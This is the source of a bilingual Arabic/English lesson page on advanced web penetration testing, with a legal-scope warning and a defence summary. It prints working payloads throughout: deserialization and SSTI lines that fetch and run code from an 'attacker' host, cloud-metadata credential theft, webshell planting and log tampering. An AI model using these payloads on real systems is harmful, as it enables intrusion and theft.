"use client";
import { LessonShell, Section, Callout, Code, Analogy, TwoCol, Card, Step, L } from "@/components/LessonShell";

export default function Page() {
  return (
    <LessonShell slug="web-redteam-deep">
      <L
        ar={
          <>
            <Section title="مقدمة — الويب ليس OWASP Top 10">
              <Analogy>
                المبتدئ بيفكر في الويب كأنه لستة ثغرات (SQLi، XSS، CSRF). المحترف بيشوفه كـ <b>طبقات بتتفاعل بطرق متوقعش</b>:
                Browser ↔ CDN ↔ WAF ↔ Load Balancer ↔ Reverse Proxy ↔ App ↔ Cache ↔ Queue ↔ DB ↔ Microservices ↔ S3.
                الـ 0day الحقيقي مش في طبقة واحدة — هو في <b>الخلاف بين طبقتين</b> على إزاي يفهموا نفس الـ byte. اللي مش بياخد باله من الفجوة دي مش هيلاقي حاجة محترمة.
              </Analogy>
              <Callout kind="danger" title="قانوني — نطاق pentest بس">
                كل اللي هنا بيتطبق على أهداف معاها تفويض مكتوب صريح، أو bug bounty جوه scope معلن، أو في الـ lab بتاعك. خارج ده = جريمة. مفيش منطقة رمادية، خليك واضح مع نفسك.
              </Callout>
              <p className="opacity-80">
                الدرس ده بيفترض إنك متمكن من OWASP Top 10 خلاص. هنا بنروح للسكة اللي orange.tw وsnyff وalbinowax وJames Kettle ساكنين فيها: request smuggling مركّب، prototype pollution → RCE، deserialization gadget chains، SSRF عن طريق cloud metadata، race conditions بـ single-packet، OAuth abuse، وWAF bypass عن طريق parser differential.
              </p>
            </Section>

            <Section title="منهجية Red Team للويب — قبل الاستغلال">
              <Step n={1} title="رسم خريطة الـ stack">
                <p>قبل ما ترمي ضربة واحدة، ارسم الـ stack: مين الـ CDN؟ Cloudflare ولا Akamai ولا Fastly؟ مين الـ WAF؟ مين الـ origin server؟ ورا origin في load balancer؟ التطبيق Java ولا Node ولا Python ولا Go ولا .NET؟ كل إجابة بتفتحلك فئة ثغرات وبتقفل تانية. الاستطلاع هو نص اللعبة.</p>
                <Code lang="bash">{`# أساسيات
curl -sI https://target | head -30          # Server, X-Powered-By, CF-Ray, Via
nslookup target                               # IP، CNAME، Anycast؟
whatweb -a 4 https://target
wafw00f https://target
# هل الـ origin مكشوف؟
shodan search ssl:"target.com" -c 200          # أو crt.sh + scan IPs مباشرة`}</Code>
              </Step>
              <Step n={2} title="بصمة الـ parser stack">
                <p>الـ HTTP parser اللي شغال على الـ CDN ممكن يفهم الـ <code>Content-Length</code> بطريقة، والـ origin يفهمها بطريقة تانية. الفرق ده هو <b>أصل الـ request smuggling</b>. ابعت طلبات malformed خفيفة وراقب الفرق في الردود:</p>
                <Code lang="bash">{`# طلب بـ Content-Length و Transfer-Encoding معاً
printf 'POST / HTTP/1.1\\r\\nHost: target\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nGGG' | \\
  ncat --ssl target 443
# اختلاف الردود = الـ stack vulnerable لـ desync`}</Code>
              </Step>
              <Step n={3} title="كشف الأسطح المخفية">
                <Code lang="bash">{`# مسارات admin، debug، API قديم
ffuf -u https://target/FUZZ -w SecLists/Discovery/Web-Content/raft-large-words.txt -mc 200,301,403
# JS bundles قد تكشف endpoints
linkfinder -i 'https://target/static/*.js' -o cli
# parameter discovery
arjun -u https://target/api/v2/users
# subdomain takeover
subzy run --targets subs.txt`}</Code>
              </Step>
            </Section>

            <Section title="HTTP Request Smuggling — قلب أبحاث 2019-2026">
              <Analogy>
                تخيل إن الـ CDN بيقرا &quot;ده طلب واحد طوله 100 byte&quot;، والـ origin بيقرا &quot;دول طلبين&quot;. الـ bytes الزيادة عند الـ CDN بتبقى
                <b> بداية طلب الضحية اللي جاي</b>. إنت بتكتب جزء من طلب شخص تاني — بتختطف جلسات، بتسرق cookies، بتعدّي WAF. مش هزار.
              </Analogy>
              <TwoCol>
                <Card title="CL.TE الكلاسيكي" color="red">
                  <Code lang="http">{`POST / HTTP/1.1
Host: target
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED`}</Code>
                  <p className="text-sm opacity-80 mt-2">CDN يستخدم CL=13 → يمرر كل شيء. Origin يستخدم TE=chunked → يقرأ "0\\r\\n\\r\\n" كنهاية، و SMUGGLED يصبح بداية الطلب التالي.</p>
                </Card>
                <Card title="TE.CL" color="red">
                  <Code lang="http">{`POST / HTTP/1.1
Host: target
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

`}</Code>
                  <p className="text-sm opacity-80 mt-2">العكس — CDN يأخذ TE، origin يأخذ CL. شائع مع HAProxy/Apache.</p>
                </Card>
                <Card title="H2.CL — HTTP/2 desync" color="red">
                  <p className="opacity-90">في HTTP/2 لا توجد <code>Content-Length</code> — لكن CDN قد يحوّل لـ HTTP/1.1 و يضيف CL خاطئة. ابعث H2 frame مع CL مكذوب → desync حقيقي.</p>
                  <Code lang="bash">{`# Burp HTTP Request Smuggler extension
# أو nghttp2 لإرسال frames مخصصة
nghttp -v --header=':method: POST' --header='content-length: 0' \\
  https://target -d 'XGGG'`}</Code>
                </Card>
                <Card title="Single-packet desync (2024+)" color="red">
                  <p className="opacity-90">كشف albinowax: HTTP/1.1 keep-alive + 0.CL يعطي smuggling حتى عبر CDNs ترفض CL/TE. التحدي = توقيت TCP packet boundary.</p>
                </Card>
              </TwoCol>
              <Callout kind="warn" title="استغلال متقدم بعد إثبات desync">
                <ul className="list-disc pe-6 space-y-1">
                  <li><b>سرقة Authorization headers</b>: smuggle طلب تحت اسم ضحية، اخزن الرد المعكوس في cache.</li>
                  <li><b>Cache poisoning</b>: اجعل CDN يخزن صفحتك الخبيثة باسم URL شرعي.</li>
                  <li><b>Internal endpoint bypass</b>: smuggle طلب بـ <code>Host: localhost</code> أو IP داخلي — يصل لـ admin APIs المحجوبة من الخارج.</li>
                  <li><b>Stored XSS via smuggle</b>: استبدل response لمستخدم آخر → JS تحت origin الموقع.</li>
                </ul>
              </Callout>
            </Section>

            <Section title="SSRF متقدم — أكثر من جلب URL">
              <Analogy>
                SSRF = إنت بتخلي السيرفر يخبط على الباب نيابة عنك. السيرفر جوه الشبكة بيثق في أصحابه: cloud metadata API، Redis، databases، internal APIs. ضربة SSRF واحدة = pivot لـ ENV كاملة. الباب اللي إنت متقفل قدامك، السيرفر مفتوحله.
              </Analogy>
              <Card title="AWS IMDS — لا يزال يعمل ضد IMDSv1" color="red">
                <Code lang="bash">{`# إذا التطبيق يجلب URL من user input
curl 'https://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'
# الاسم → الـ creds
curl 'https://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME'
# AccessKeyId + SecretAccessKey + Token → الآن أنت EC2 instance`}</Code>
              </Card>
              <Card title="GCP / Azure — مختلفة قليلاً" color="red">
                <Code lang="bash">{`# GCP — تتطلب header
curl -H 'Metadata-Flavor: Google' \\
  'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token'
# Azure
curl -H 'Metadata: true' \\
  'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'`}</Code>
                <p className="text-sm opacity-80 mt-2">إذا التطبيق يحجب IP literal، جرّب <code>http://169.254.169.254.nip.io</code>، DNS rebinding، أو IPv6 <code>[::ffff:a9fe:a9fe]</code>.</p>
              </Card>
              <Card title="Blind SSRF عبر التوقيت + DNS" color="red">
                <Code lang="bash">{`# لا ترى الرد؟ استخدم out-of-band
curl 'https://target/api?webhook=http://attacker.burpcollab.net/x'
# أو DNS-only: تحفيز التطبيق على resolve لـ subdomain فريد
curl 'https://target/api?host=$(uuidgen).attacker.com'
# سجل DNS hits → SSRF أُكد`}</Code>
              </Card>
              <Card title="Gopher / Redis SSRF" color="red">
                <Code lang="bash">{`# لو SSRF يقبل أي scheme
curl "https://target/fetch?url=gopher://10.0.0.5:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a..."
# تركيب أوامر Redis كاملة → كتابة مفتاح SSH أو cron job`}</Code>
              </Card>
            </Section>

            <Section title="Deserialization — RCE من سلسلة gadget">
              <p className="opacity-90">
                تطبيقات Java/PHP/Python/.NET/Ruby اللي بتعمل deserialize لـ input غير موثوق دي نقطة RCE كلاسيكية. الفكرة: مش بتشغّل الكود مباشرة — لأ، بتبني سلسلة من استدعاءات الـ getter/setter/magic methods (اسمها gadget chain) بتنتهي عند <code>Runtime.exec</code> أو <code>system()</code>. السلسلة دي هي ذكاء الـ exploit.
              </p>
              <TwoCol>
                <Card title="Java — ysoserial" color="red">
                  <Code lang="bash">{`java -jar ysoserial.jar CommonsCollections5 'curl http://attacker/x|sh' > p.bin
curl -X POST https://target/api/object \\
  -H 'Content-Type: application/x-java-serialized-object' \\
  --data-binary @p.bin`}</Code>
                  <p className="text-sm opacity-80 mt-2">Gadgets: CommonsCollections1-7, Spring1-2, Hibernate1-2, JRMPClient. اختر بناءً على dependencies الموجودة.</p>
                </Card>
                <Card title=".NET — ysoserial.net" color="red">
                  <Code lang="bash">{`ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate \\
  -c "powershell IEX(IWR http://attacker/p.ps1)" -o base64
# ViewState أو Session
curl 'https://target/Default.aspx' -d "__VIEWSTATE=<base64>"`}</Code>
                </Card>
                <Card title="PHP — phpggc" color="red">
                  <Code lang="bash">{`phpggc -u Laravel/RCE9 system "id" | base64 -w0
# طبق على endpoint يعمل unserialize() على cookie أو body`}</Code>
                </Card>
                <Card title="Python — pickle" color="red">
                  <Code lang="python">{`import pickle, base64, os
class P:
    def __reduce__(self):
        return (os.system, ('curl http://attacker/x|sh',))
print(base64.b64encode(pickle.dumps(P())).decode())`}</Code>
                </Card>
              </TwoCol>
            </Section>

            <Section title="Prototype Pollution — JS من XSS إلى RCE">
              <Analogy>
                في JavaScript كل object بيرث من <code>Object.prototype</code>. لو قدرت تعدّل في <code>__proto__</code>، إنت بتغيّر سلوك <b>كل object في التطبيق</b> — حتى الكائنات اللي لسه متعملتش. على السيرفر (Node.js)، ده بيوصلك لـ RCE من غير ما حد ياخد باله.
              </Analogy>
              <Code lang="bash">{`# Client-side
curl 'https://target/api/merge?__proto__[isAdmin]=true'
# الآن أي {} = isAdmin: true

# Server-side Node.js → RCE
# لو التطبيق يستخدم child_process.spawn أو render template
curl -X POST https://target/api/profile \\
  -H 'Content-Type: application/json' \\
  --data '{"__proto__":{"shell":"/bin/sh","argv0":"-c","NODE_OPTIONS":"--inspect-brk=0.0.0.0:9229"}}'
# عند أول spawn → debugger مكشوف → CDP RCE`}</Code>
              <Callout kind="warn" title="Gadgets معروفة">
                <ul className="list-disc pe-6 space-y-1">
                  <li><b>handlebars/pug/ejs</b>: pollute template helpers → SSTI → RCE.</li>
                  <li><b>express</b>: pollute <code>settings.view</code> → render path traversal.</li>
                  <li><b>NODE_OPTIONS</b>: pollute env via <code>process.env.NODE_OPTIONS</code> → debugger inject.</li>
                </ul>
              </Callout>
            </Section>

            <Section title="Race Conditions — Single-Packet Attack (Kettle 2023)">
              <Analogy>
                طلبين متطابقين بيوصلوا قبل ما الأول يخلّص الـ check → نفس العملية بتتنفذ مرتين. كلاسيكياً ده محتاج توقيت دقيق. Kettle أثبت إنك تقدر تبعت <b>20-30 طلب في TCP packet واحد</b> → كلهم بيوصلوا في نفس الـ millisecond. اللعبة كانت ضد الراتر، دلوقتي مع الراتر.
              </Analogy>
              <Code lang="bash">{`# Burp Suite "Send group in single packet"
# أو turbo-intruder script
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, requestsPerConnection=30, pipeline=False)
    for i in range(30):
        engine.queue(target.req)
engine.openGate()  # يطلق كل الطلبات معاً`}</Code>
              <Callout kind="warn" title="استغلالات حقيقية">
                <ul className="list-disc pe-6 space-y-1">
                  <li><b>كوبون مرة واحدة</b> يُطبّق 30 مرة → خصم 100% من السلة.</li>
                  <li><b>تحويل رصيد</b> — استنزاف double-spending.</li>
                  <li><b>OTP</b> — 6 أرقام × عدد محاولات على جلسات متعددة في نفس الميلي ثانية → bypass rate-limit.</li>
                  <li><b>دعوة مستخدم</b> لمساحة عمل مدفوعة → 30 invite بـ نفس الـ token.</li>
                </ul>
              </Callout>
            </Section>

            <Section title="Cache Poisoning — تسليح CDN">
              <Code lang="http">{`# CDN يحدد الـ cache key من URL + بعض headers فقط
# لو التطبيق يعكس X-Forwarded-Host في الرد:
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

# Response: <link href="//attacker.com/style.css">
# CDN يخزن هذا الرد لكل الزوار التاليين على /
# = stored XSS عبر cache على homepage`}</Code>
              <p className="opacity-90 mt-2">
                التقنية الأقوى من دي: <b>Cache Deception</b>. <code>/profile/x.css</code> — التطبيق بيقدّم الـ profile (بيتجاهل .css)، الـ CDN بيخزّنه كأنه static. أي زائر هييجي بعدك هيشوف ملفك الشخصي. كارثة بصمت.
              </p>
            </Section>

            <Section title="OAuth / OIDC — كيف تكسر تسجيل الدخول">
              <ol className="list-decimal pe-6 space-y-2 opacity-90">
                <li><b>Open redirect على redirect_uri</b>: إذا التطبيق يقبل <code>redirect_uri=https://app.com.attacker.com</code> → تصل code للمهاجم.</li>
                <li><b>Authorization code injection</b>: ضحية يولّد code، أنت تُسلّمه لـ session جلسة أخرى → استلاء على حساب.</li>
                <li><b>state parameter مفقود</b> → CSRF على ربط حسابات.</li>
                <li><b>JWT alg=none</b> أو <b>alg=HS256 مع public key كـ secret</b>: <code>jwt_tool -X i</code>.</li>
                <li><b>kid/jku/x5u injection</b>: أشر لـ JWKS مسيطَر عليه → JWT يثبَت بمفتاحك.</li>
                <li><b>Refresh token leakage</b> في referer أو localStorage على XSS.</li>
                <li><b>PKCE bypass</b>: لو السيرفر يقبل code بدون code_verifier → استلاء code → access.</li>
              </ol>
              <Code lang="bash">{`# JWT tool — اختبر الكل دفعة
jwt_tool -t https://target/api -rh "Authorization: Bearer JWT" -M at
# ابحث عن Confused Deputy: JWT signed by IdP A مقبول في app B`}</Code>
            </Section>

            <Section title="GraphQL — سطح هجوم منسي">
              <Code lang="graphql">{`# 1) introspection غالباً مفتوح حتى في prod
curl -X POST https://target/graphql -H 'Content-Type: application/json' \\
  -d '{"query":"{__schema{types{name fields{name}}}}"}'

# 2) Batching attacks → bypass rate-limit على login
{"query":"mutation { l1: login(u:\\"a\\",p:\\"1\\"){t} l2: login(u:\\"a\\",p:\\"2\\"){t} ... l1000: login(...) }"}

# 3) Field-level IDOR
{ user(id: 99) { email passwordHash } }   # الـ resolver لا يفحص ownership

# 4) Nested query DoS
{ user { friends { friends { friends { ...×10 } } } } }`}</Code>
            </Section>

            <Section title="WAF Bypass — معركة الـ parser">
              <p className="opacity-90">
                الـ WAF بيشغّل regex على اللي هو فاهمه. التطبيق فاهم حاجة مختلفة شوية. الفرق ده هو سطح الـ bypass. اللعبة كلها في الـ parser differential.
              </p>
              <TwoCol>
                <Card title="ترميز مزدوج" color="red">
                  <Code lang="bash">{`# WAF يفك URL-encode مرة. التطبيق (PHP/.NET) قد يفك مرتين.
?id=1%2527%2520OR%25201=1
# %25 → % → %27 → '`}</Code>
                </Card>
                <Card title="Mixed case + comments" color="red">
                  <Code lang="sql">{`UnIoN/**/SeLeCt/**/1,2,3
# SQL parsers يقبلون كل التوليفات`}</Code>
                </Card>
                <Card title="JSON in URL param" color="red">
                  <Code lang="bash">{`# WAF يفحص as URL، التطبيق يـ JSON.parse
?filter={"$gt":""}   # MongoDB injection`}</Code>
                </Card>
                <Card title="Body smuggling" color="red">
                  <Code lang="bash">{`# Content-Type: text/plain → WAF يتجاهل، التطبيق يقرأ كـ JSON
curl -H 'Content-Type: text/plain' --data '{"role":"admin"}' \\
  https://target/api/profile`}</Code>
                </Card>
                <Card title="Unicode normalization" color="red">
                  <Code lang="bash">{`# K (FULLWIDTH K) يصبح K بعد NFKC
?cmd=%EF%BC%AB %EF%BC%A5 %EF%BC%92  # Kerberos? K E 2 ...
# مفيد ضد regex على ASCII فقط`}</Code>
                </Card>
                <Card title="HTTP/2 pseudo-headers" color="red">
                  <p className="opacity-90 text-sm">WAFs قديمة لا تفحص <code>:authority</code> بنفس صرامة <code>Host</code>. حقن قيم مختلفة → الـ origin يقرأ غير ما يقرأه WAF.</p>
                </Card>
              </TwoCol>
            </Section>

            <Section title="Blind exploitation — عندما لا ترى شيئاً">
              <ol className="list-decimal pe-6 space-y-2 opacity-90">
                <li><b>OOB (Out-of-Band)</b>: Burp Collaborator، interactsh، DNS+HTTP+SMTP. كل subdomain فريد = مؤشر.</li>
                <li><b>Time-based</b>: <code>SLEEP(5)</code> في SQLi، <code>setTimeout</code> في NoSQL، <code>thread.sleep</code> في Java SSTI.</li>
                <li><b>Boolean-based</b>: لاحظ تغيّر طول الرد، عدد الأسطر، أو وجود/غياب كلمة معينة.</li>
                <li><b>Side-channel timing</b>: hash comparison بدون constant-time → تخمين byte-by-byte.</li>
                <li><b>Cache-based</b>: عملية تكلفتها cache miss تكشف وجود/عدم وجود قيمة.</li>
              </ol>
              <Code lang="bash">{`# مثال blind SSTI Jinja2 مع OOB
curl 'https://target/render?name={{config.__class__.__init__.__globals__["os"].popen("curl http://OOB/?$(id)").read()}}'`}</Code>
            </Section>

            <Section title="Post-Exploitation على الويب — بعد RCE">
              <ol className="list-decimal pe-6 space-y-2 opacity-90">
                <li><b>اقرأ env vars فوراً</b>: <code>cat /proc/self/environ</code>, <code>env</code>. DB credentials، AWS keys، JWT secrets.</li>
                <li><b>ابحث عن .env / config.yaml / appsettings.json</b> داخل WORKDIR.</li>
                <li><b>K8s؟</b> <code>cat /var/run/secrets/kubernetes.io/serviceaccount/token</code> — قد يكون لك RBAC قوي.</li>
                <li><b>Cloud metadata من container</b>: نفس IMDS يعمل من داخل pod غير مقيد.</li>
                <li><b>SSH keys في home</b>، authorized_keys، known_hosts → خريطة pivot.</li>
                <li><b>قاعدة بيانات</b>: استخرج users + password hashes + session tokens. المستخدمون يعيدون استخدام كلمات السر.</li>
                <li><b>زرع backdoor صامت</b>: webshell مخفي في endpoint موجود (مش ملف جديد). أو git hook، أو cron.</li>
                <li><b>غطِّ آثارك</b>: لا تنفّذ <code>rm -rf /var/log</code> — ذلك جرس إنذار. عدّل سجلات محددة.</li>
              </ol>
            </Section>

            <Section title="OPSEC للمهاجم على الويب">
              <ul className="list-disc pe-6 space-y-2 opacity-90">
                <li><b>متستخدمش الـ IP بتاع بيتك أبداً.</b> VPN → VPS → target. ولو ينفع، CDN-fronted callback.</li>
                <li><b>الـ User-Agent يطابق جمهور الهدف.</b> متبعتش <code>python-requests/2.28</code> — ده زي ما تقول &quot;أهلاً أنا روبوت&quot;.</li>
                <li><b>ابعد عن أنماط الفحص الجماعي.</b> Nuclei بكل الـ templates بيشعل الـ WAF فوراً. اشتغل template by template مع <code>--rate-limit 5</code>.</li>
                <li><b>تأخير يدوي</b> على الإجراءات الحرجة. مفيش إنسان بيعمل 100 request في الثانية.</li>
                <li><b>خبّي الـ payload في حقل مش بيتسجّل.</b> كتير من التطبيقات بتسجّل الـ query string بس — استخدم الـ body أو الـ cookie.</li>
                <li><b>متستخدمش burpcollaborator.net مباشرة</b> في العمليات الحساسة. استضيف interactsh على دومين خاص بيك.</li>
                <li><b>تنظيف post-exploitation</b>: كل ملف رفعته، كل log عملته، كل حساب أضفته — وثّقه ثم شيله. حياتك المهنية في الترتيب.</li>
              </ul>
            </Section>

            <Section title="معامل تطبيقية — تعلّم بالتجربة">
              <ul className="list-disc pe-6 space-y-1 opacity-90">
                <li><b>PortSwigger Web Security Academy</b> — أفضل مرجع تفاعلي مجاني.</li>
                <li><b>HackTheBox / TryHackMe</b> — مسارات web من الأساسي للخبير.</li>
                <li><b>Bug bounty على HackerOne / Bugcrowd</b> — برامج VDP بدون مكافأة لكنها قانونية للتدريب.</li>
                <li><b>OWASP Juice Shop / DVWA / WebGoat</b> — معامل محلية.</li>
                <li><b>كتاب The Web Application Hacker's Handbook</b> — قديم لكنه أساس لا غنى عنه.</li>
                <li><b>أبحاث James Kettle / Orange Tsai / Sam Curry</b> — اقرأ كل ما يكتبون.</li>
              </ul>
            </Section>

            <Section title="الدفاع — مرجع سريع">
              <Callout kind="good" title="من شيء واحد فقط لكل تقنية">
                <ul className="list-disc pe-6 space-y-1">
                  <li><b>Smuggling</b>: HTTP/2 end-to-end، disable downgrade على CDN، reject ambiguous CL/TE.</li>
                  <li><b>SSRF</b>: قائمة بيضاء صريحة للـ hosts، حظر IP private + link-local + IMDS، IMDSv2 إجباري.</li>
                  <li><b>Deserialization</b>: لا تـ deserialize untrusted. لو لازم — JSON فقط مع schema validation.</li>
                  <li><b>Prototype pollution</b>: <code>Object.freeze(Object.prototype)</code> + libraries حديثة.</li>
                  <li><b>Race</b>: idempotency keys، DB row locks، single-flight على العمليات الحرجة.</li>
                  <li><b>Cache</b>: cache-key يشمل كل الـ input headers، لا تخزن responses بـ Vary غامض.</li>
                  <li><b>OAuth</b>: PKCE إجباري، state إجباري، redirect_uri exact match.</li>
                  <li><b>GraphQL</b>: عطّل introspection في prod، depth/complexity limits، per-field auth.</li>
                  <li><b>WAF</b>: layered defense — WAF + input validation داخل التطبيق + output encoding.</li>
                </ul>
              </Callout>
            </Section>
          </>
        }
        en={
          <>
            <Section title="Intro — the web is not the OWASP Top 10">
              <Analogy>
                Beginners think of the web as a list of bugs (SQLi, XSS, CSRF). Pros think of it as <b>layers
                interacting in unexpected ways</b>: Browser ↔ CDN ↔ WAF ↔ LB ↔ Reverse Proxy ↔ App ↔ Cache ↔ Queue ↔ DB
                ↔ Microservices ↔ S3. Real 0-days are not in one layer — they're in the <b>disagreement between two
                layers</b> over how to interpret the same byte.
              </Analogy>
              <Callout kind="danger" title="Legal — pentest scope only">
                Everything below is run against targets with explicit written authorization, in-scope bug bounty, or in
                your own lab. Anything else is a crime — there is no grey zone.
              </Callout>
              <p className="opacity-80">
                This lesson assumes mastery of the OWASP Top 10. Here we go where orange.tw, snyff, albinowax and James
                Kettle actually live: chained request smuggling, prototype pollution → RCE, deserialization gadget
                chains, SSRF via cloud metadata, single-packet races, OAuth abuse, parser-differential WAF bypass.
              </p>
            </Section>

            <Section title="Red-team methodology — before exploitation">
              <Step n={1} title="Map the stack">
                <p>Before throwing a single payload, map: which CDN — Cloudflare, Akamai, Fastly? Which WAF? Which origin? Is there a load balancer? Java/Node/Python/Go/.NET? Each answer opens one bug class and closes another.</p>
                <Code lang="bash">{`curl -sI https://target | head -30          # Server, X-Powered-By, CF-Ray, Via
nslookup target                              # IP, CNAME, anycast?
whatweb -a 4 https://target
wafw00f https://target
# Origin exposed?
shodan search ssl:"target.com" -c 200          # or crt.sh + scan IPs directly`}</Code>
              </Step>
              <Step n={2} title="Fingerprint the parser stack">
                <p>The HTTP parser on the CDN may interpret <code>Content-Length</code> one way; the origin another. That gap is the <b>root of request smuggling</b>. Send light malformed probes and watch differences:</p>
                <Code lang="bash">{`printf 'POST / HTTP/1.1\\r\\nHost: target\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nGGG' | \\
  ncat --ssl target 443
# Different responses = stack is desync-vulnerable`}</Code>
              </Step>
              <Step n={3} title="Surface enumeration">
                <Code lang="bash">{`ffuf -u https://target/FUZZ -w SecLists/Discovery/Web-Content/raft-large-words.txt -mc 200,301,403
linkfinder -i 'https://target/static/*.js' -o cli
arjun -u https://target/api/v2/users
subzy run --targets subs.txt`}</Code>
              </Step>
            </Section>

            <Section title="HTTP Request Smuggling — the core of 2019-2026 research">
              <Analogy>
                The CDN reads "this is one 100-byte request"; the origin reads "two requests". The leftover bytes at the
                CDN become <b>the start of the next victim's request</b>. You write part of someone else's request —
                hijack sessions, steal cookies, bypass WAF.
              </Analogy>
              <TwoCol>
                <Card title="Classic CL.TE" color="red">
                  <Code lang="http">{`POST / HTTP/1.1
Host: target
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED`}</Code>
                  <p className="text-sm opacity-80 mt-2">CDN uses CL=13 → forwards everything. Origin uses TE → sees "0\\r\\n\\r\\n" as end; SMUGGLED becomes the start of the next request.</p>
                </Card>
                <Card title="TE.CL" color="red">
                  <Code lang="http">{`POST / HTTP/1.1
Host: target
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

`}</Code>
                  <p className="text-sm opacity-80 mt-2">Inverse — CDN takes TE, origin takes CL. Common with HAProxy/Apache.</p>
                </Card>
                <Card title="H2.CL — HTTP/2 desync" color="red">
                  <p className="opacity-90">HTTP/2 has no <code>Content-Length</code> — but a CDN downgrading to HTTP/1.1 may add a wrong CL. Send H2 frames with a forged CL → real desync.</p>
                  <Code lang="bash">{`# Burp HTTP Request Smuggler extension, or:
nghttp -v --header=':method: POST' --header='content-length: 0' \\
  https://target -d 'XGGG'`}</Code>
                </Card>
                <Card title="Single-packet desync (2024+)" color="red">
                  <p className="opacity-90">albinowax's discovery: HTTP/1.1 keep-alive + 0.CL gives smuggling even past CDNs that reject CL/TE. The trick is timing the TCP packet boundary.</p>
                </Card>
              </TwoCol>
              <Callout kind="warn" title="Advanced exploitation once desync is proven">
                <ul className="list-disc ps-6 space-y-1">
                  <li><b>Steal Authorization headers</b>: smuggle a request as the victim, store the reflected response in cache.</li>
                  <li><b>Cache poisoning</b>: make the CDN store your malicious page under a legit URL.</li>
                  <li><b>Internal endpoint bypass</b>: smuggle a request with <code>Host: localhost</code> or an internal IP — reaches admin APIs blocked from the outside.</li>
                  <li><b>Stored XSS via smuggle</b>: replace another user's response → JS under the site origin.</li>
                </ul>
              </Callout>
            </Section>

            <Section title="Advanced SSRF — more than fetching a URL">
              <Analogy>
                SSRF = you make the server knock on a door for you. The server is inside the network and trusts its
                friends: cloud metadata, Redis, internal APIs. One SSRF = pivot to the entire ENV.
              </Analogy>
              <Card title="AWS IMDS — still works against IMDSv1" color="red">
                <Code lang="bash">{`curl 'https://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'
curl 'https://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME'
# AccessKeyId + SecretAccessKey + Token → you are now that EC2 instance`}</Code>
              </Card>
              <Card title="GCP / Azure — slightly different" color="red">
                <Code lang="bash">{`curl -H 'Metadata-Flavor: Google' \\
  'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token'
curl -H 'Metadata: true' \\
  'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'`}</Code>
                <p className="text-sm opacity-80 mt-2">If literal IPs are blocked, try <code>http://169.254.169.254.nip.io</code>, DNS rebinding, or IPv6 <code>[::ffff:a9fe:a9fe]</code>.</p>
              </Card>
              <Card title="Blind SSRF via timing + DNS" color="red">
                <Code lang="bash">{`curl 'https://target/api?webhook=http://attacker.burpcollab.net/x'
curl 'https://target/api?host=$(uuidgen).attacker.com'
# Watch DNS hits → SSRF confirmed`}</Code>
              </Card>
              <Card title="Gopher / Redis SSRF" color="red">
                <Code lang="bash">{`curl "https://target/fetch?url=gopher://10.0.0.5:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a..."
# Build full Redis commands → SSH key write or cron job`}</Code>
              </Card>
            </Section>

            <Section title="Deserialization — RCE from a gadget chain">
              <p className="opacity-90">
                Java/PHP/Python/.NET/Ruby apps that deserialize untrusted input are a classic RCE source. The trick: don't
                run code directly — chain getter/setter/magic-method calls (a gadget chain) ending at <code>Runtime.exec</code>
                or <code>system()</code>.
              </p>
              <TwoCol>
                <Card title="Java — ysoserial" color="red">
                  <Code lang="bash">{`java -jar ysoserial.jar CommonsCollections5 'curl http://attacker/x|sh' > p.bin
curl -X POST https://target/api/object \\
  -H 'Content-Type: application/x-java-serialized-object' \\
  --data-binary @p.bin`}</Code>
                  <p className="text-sm opacity-80 mt-2">Gadgets: CommonsCollections1-7, Spring1-2, Hibernate1-2, JRMPClient. Pick based on present dependencies.</p>
                </Card>
                <Card title=".NET — ysoserial.net" color="red">
                  <Code lang="bash">{`ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate \\
  -c "powershell IEX(IWR http://attacker/p.ps1)" -o base64
curl 'https://target/Default.aspx' -d "__VIEWSTATE=<base64>"`}</Code>
                </Card>
                <Card title="PHP — phpggc" color="red">
                  <Code lang="bash">{`phpggc -u Laravel/RCE9 system "id" | base64 -w0
# Apply against an endpoint that calls unserialize() on a cookie or body`}</Code>
                </Card>
                <Card title="Python — pickle" color="red">
                  <Code lang="python">{`import pickle, base64, os
class P:
    def __reduce__(self):
        return (os.system, ('curl http://attacker/x|sh',))
print(base64.b64encode(pickle.dumps(P())).decode())`}</Code>
                </Card>
              </TwoCol>
            </Section>

            <Section title="Prototype Pollution — JS from XSS to RCE">
              <Analogy>
                Every JS object inherits from <code>Object.prototype</code>. If you can modify <code>__proto__</code>,
                you change the behavior of <b>every object in the app</b> — including ones not yet created. Server-side
                (Node.js) it can reach RCE.
              </Analogy>
              <Code lang="bash">{`# Client-side
curl 'https://target/api/merge?__proto__[isAdmin]=true'
# Now any {} = isAdmin: true

# Server-side Node.js → RCE
curl -X POST https://target/api/profile \\
  -H 'Content-Type: application/json' \\
  --data '{"__proto__":{"shell":"/bin/sh","argv0":"-c","NODE_OPTIONS":"--inspect-brk=0.0.0.0:9229"}}'
# Next spawn → debugger exposed → CDP RCE`}</Code>
              <Callout kind="warn" title="Known gadgets">
                <ul className="list-disc ps-6 space-y-1">
                  <li><b>handlebars/pug/ejs</b>: pollute template helpers → SSTI → RCE.</li>
                  <li><b>express</b>: pollute <code>settings.view</code> → render path traversal.</li>
                  <li><b>NODE_OPTIONS</b>: pollute env via <code>process.env.NODE_OPTIONS</code> → debugger inject.</li>
                </ul>
              </Callout>
